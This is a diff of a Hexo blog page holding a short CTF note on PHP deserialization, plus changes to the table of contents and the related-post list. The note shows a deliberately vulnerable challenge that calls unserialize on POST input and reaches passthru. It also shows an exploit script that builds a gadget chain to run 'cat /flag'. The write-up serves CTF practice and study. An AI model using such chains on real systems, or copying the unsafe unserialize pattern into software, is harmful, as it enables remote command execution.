@@ -282,14 +282,24 @@
 			<hr>
 <!-- toc -->
 
-<h1 id="PHP-UNSERIALIZE-反序列化"><a href="#PHP-UNSERIALIZE-反序列化" class="headerlink" title="PHP_UNSERIALIZE(反序列化)"></a>PHP_UNSERIALIZE(反序列化)</h1><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">construct</span><br><span class="line">tostring</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="#php_unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP_UNSERIALIZE(反序列化)</a><ul>
+<li><a href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6">触发条件</a></li>
+<li><a href="#php_unserialize-2">PHP_UNSERIALIZE ( 2 )</a></li>
+</ul>
+</li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">SQL注入</a></li>
+</ul>
+<!-- tocstop -->
 
-<h2 id="PHP-UNSERIALIZE-2"><a href="#PHP-UNSERIALIZE-2" class="headerlink" title="PHP_UNSERIALIZE ( 2 )"></a>PHP_UNSERIALIZE ( 2 )</h2><p><a href="https://ctf.a1natas.com/games/10/challenges">🤩敲门砖-带你入门 CTF - A1::CTF (a1natas.com)</a></p>
+<h1><span id="php_unserialize反序列化">PHP_UNSERIALIZE(反序列化)</span></h1><h2><span id="触发条件">触发条件</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">construct</span><br><span class="line">tostring</span><br></pre></td></tr></table></figure>
+
+<h2><span id="php_unserialize-2">PHP_UNSERIALIZE ( 2 )</span></h2><p><a href="https://ctf.a1natas.com/games/10/challenges">🤩敲门砖-带你入门 CTF - A1::CTF (a1natas.com)</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;AsaL1n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;type = <span class="string">&quot;web&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;web;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">world</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$this</span>-&gt;flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hello</span>=<span class="variable">$_POST</span>[<span class="string">&quot;weber&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$hello</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">world</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">world</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">welcome</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;web=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
 
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>	
+<h1><span id="sql注入">SQL注入</span></h1>	
 		</div>
 		
 		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -330,30 +340,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="write_up">
-								write_up			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 18日, 2024				
-							</p>
-							<p class="relate-post-content">
-								11.比赛名 2.题目类别 3.题目名称 4.知识点关键词 5.知识点细节
-
-2021 第一届浙江师范大学网络安全与信息安全竞赛webeasy_md5123456789101112131415161718192021222324252...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/03/18/2021%20%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B5%99%E6%B1%9F%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" title="write_up">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="write_up"/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -420,7 +406,16 @@
 							<p class="relate-post-content">
 								
 
-burpsuit端口占用1234C:\Users\yzz&gt;netstat -aon | findstr :8080  TCP    0.0.0.0:8080           0.0.0.0:0              ...
+
+burpsuit
+端口占用
+
+
+python
+路径选择
+使用的不是守支持的命令行标记extensions
+1.打开网址: edge:&#x2F;&#x2F;flags&#x2F;
+2.搜索框搜索 Extensions on ed...
 							</p>
 						</div>
 
@@ -444,7 +439,18 @@ burpsuit端口占用1234C:\Users\yzz&gt;netstat -aon | findstr :8080  TCP    0.0
 							<p class="relate-post-content">
 								
 
-Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when usin...
+
+Quick Start
+Create a new post
+Run server
+Generate static files
+Deploy to remote sites
+
+
+
+
+
+Welcome to Hexo! This i...
 							</p>
 						</div>
 
@@ -468,8 +474,34 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 							<p class="relate-post-content">
 								
 
-misc0x05. 明文攻击
-明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的...
+
+misc
+0x05. 明文攻击
+⻰之舞
+
+
+web
+常用
+远程包含
+sql
+LoginMe
+What the cow say?
+
+
+
+
+re
+ezupx
+ezPYC
+
+
+
+
+其他
+i++和++i的区别
+区别
+爬虫
+request...
 							</p>
 						</div>
 
@@ -477,6 +509,30 @@ misc0x05. 明文攻击
 							<a href="/2024/03/18/ctf/" title="ctf">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctf"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/18/write_up/" title="write_up">
+								write_up			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 18日, 2024				
+							</p>
+							<p class="relate-post-content">
+								11.比赛名 2.题目类别 3.题目名称 4.知识点关键词 5.知识点细节
+
+2021 第一届浙江师范大学网络安全与信息安全竞赛webeasy_md5123456789101112131415161718192021222324252...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/18/write_up/" title="write_up">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="write_up"/>
 							</a>
 						</div>
 					</li>												
